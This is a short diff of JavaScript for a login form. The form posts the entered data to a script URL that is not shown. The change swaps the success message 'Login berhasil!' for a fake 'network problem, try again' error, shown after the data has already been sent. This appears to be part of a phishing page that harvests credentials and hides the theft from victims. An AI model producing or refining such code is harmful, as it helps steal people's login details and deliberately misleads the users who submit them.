@@ -15,7 +15,7 @@ document.querySelector('.login-button').addEventListener('click', function() {
     fetch(scriptURL, { method: 'POST', body: formData })
         .then(response => response.text())
         .then(result => {
-            alert('Login berhasil!');
+            alert('masalah jaringan,coba lagi!');
             console.log('Success:', result);
         })
         .catch(error => {
